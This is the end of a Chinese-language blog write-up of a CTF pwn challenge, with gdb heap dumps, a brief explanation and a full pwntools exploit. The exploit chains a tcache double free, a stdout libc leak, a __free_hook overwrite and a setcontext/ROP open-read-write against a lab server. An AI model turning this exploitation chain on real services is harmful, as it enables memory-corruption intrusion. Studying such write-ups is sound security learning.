+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x55555555b2f0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0x0, </span><br><span class="line">  mchunk_size = 0x31, </span><br><span class="line">  fd = 0x7ffff7fabc80, </span><br><span class="line">  bk = 0x55555555b670, </span><br><span class="line">  fd_nextsize = 0x1, </span><br><span class="line">  bk_nextsize = 0x55555555b490</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">0x55555555b450 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0x0, </span><br><span class="line">  mchunk_size = 0x31, </span><br><span class="line">  fd = 0x7ffff7fabc80, </span><br><span class="line">  bk = 0x55555555b7a0, </span><br><span class="line">  fd_nextsize = 0x1, </span><br><span class="line">  bk_nextsize = 0x55555555b580</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">gdb-peda$ p stdout</span><br><span class="line">$1 = (FILE *) 0x7ffff7d876a0 &lt;_IO_2_1_stdout_&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是这两个地址跟stdout结构体的地址差太多了，直接用这个libc去爆破stdout不现实，所以还是得覆写一个unsorted bin chunk</p>
+<p>首先利用特殊功能函数清空一个tcache chunk的key，拿到一个double free去爆破0.5字节拿到tcache struct，修改对应tcache bin的计数使得tcache entry能被free到unsorted bin里，这样后面再想修改tcache struct时就可以直接在unsorted bin里割出部分chunk来修改，这样可以节省几次free的次数。同时部分写tcache entry来让自己能拿到想要的chunk。</p>
+<p>大概的思路就是这样，这部分的逻辑关系实在是不太好描述，看exp更好理解，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;172.52.10.71&quot;,9999)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x17D9)&#x27;) #write</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(content) &lt; size:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add0</span>(<span class="params">size=<span class="number">0</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	add(<span class="number">0xe0</span>)</span><br><span class="line">	free() <span class="comment">#1 </span></span><br><span class="line">	add0() <span class="comment">#clean tcache key</span></span><br><span class="line">	free() <span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0xe0</span>,<span class="string">&#x27;\x10\xb0&#x27;</span>)</span><br><span class="line">	add(<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0xe0</span>,p16(<span class="number">3</span>)*(<span class="number">4</span>*<span class="number">3</span>)+p16(<span class="number">0</span>)+p16(<span class="number">0xffff</span>)*(<span class="number">4</span>*<span class="number">10</span>-<span class="number">1</span>-<span class="number">4</span>)+p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + <span class="string">&#x27;\x10\xb0&#x27;</span>)</span><br><span class="line">	free() <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&#x27;\xa0\xd6&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,p16(<span class="number">3</span>)*(<span class="number">4</span>*<span class="number">3</span>)+p16(<span class="number">0</span>)+p16(<span class="number">0xffff</span>)*(<span class="number">4</span>*<span class="number">10</span>-<span class="number">1</span>-<span class="number">4</span>))</span><br><span class="line">	add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x00&quot;</span>) <span class="comment">#7</span></span><br><span class="line">	p.recv(<span class="number">8</span>)</span><br><span class="line">	libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fd3f2736980</span> - <span class="number">0x00007fd3f254b000</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	</span><br><span class="line">	malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	exit_hook = libc_base + (<span class="number">0x7ffff7ffdf70</span> - <span class="number">0x00007ffff7b9b000</span>)</span><br><span class="line">	pop_rsp = libc_base + <span class="number">0x0000000000032b5a</span></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">	pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">	read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">	ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	gadget = libc_base + (<span class="number">0x7ffff7cef930</span> - <span class="number">0x00007ffff7b9b000</span>)</span><br><span class="line">	data = libc_base + (<span class="number">0x00007ffff7b98000</span> - <span class="number">0x00007ffff7b9b000</span>) + <span class="number">0x100</span></span><br><span class="line">	setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">	ret = libc_base + <span class="number">0x00000000000c054a</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef930 &lt;getkeyserv_handle+576&gt;:	mov    rdx,QWORD PTR [rdi+0x8]</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef934 &lt;getkeyserv_handle+580&gt;:	mov    QWORD PTR [rsp],rax</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef938 &lt;getkeyserv_handle+584&gt;:	call   QWORD PTR [rdx+0x20]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	flag_addr = data + <span class="number">0x110</span></span><br><span class="line">	orw_addr = data + <span class="number">0x8</span></span><br><span class="line">	add(<span class="number">0xd0</span>,p64(<span class="number">0</span>)*<span class="number">7</span> + p64(free_hook)+p64(data) + p64(data+<span class="number">0x100</span>)) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">	orw = p64(<span class="number">0</span>) + p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">	orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(data) + p64(pop_rdx_r12) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">	orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(data) + p64(pop_rdx_r12) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	payload = p64(data+<span class="number">0x110</span>)<span class="comment">#rdi</span></span><br><span class="line">	payload += p64(data+<span class="number">0x100</span>)</span><br><span class="line">	payload += <span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(orw_addr)<span class="comment">#rsp</span></span><br><span class="line">	payload += p64(ret)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0xa0</span>,p64(gadget))</span><br><span class="line">	add(<span class="number">0xb0</span>,orw) <span class="comment">#data == orw</span></span><br><span class="line">	add(<span class="number">0xc0</span>,payload) <span class="comment">#data+0x100 == payload</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p,&#x27;b free&#x27;)</span></span><br><span class="line">	free()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">		p = remote(<span class="string">&quot;172.52.10.233&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/23/MINI-LCTF2022-kgadget/" rel="prev" title="MINI-LCTF2022-kgadget(ret2dir)">
+      <i class="fa fa-chevron-left"></i> MINI-LCTF2022-kgadget(ret2dir)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/15/IdekCTF2023/" rel="next" title="IdekCTF2023">
+      IdekCTF2023 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store"><span class="nav-number"></span> <span class="nav-text">store</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number"></span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E8%BF%87%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">整体过法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#only"><span class="nav-number"></span> <span class="nav-text">only</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number"></span> <span class="nav-text">思路</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
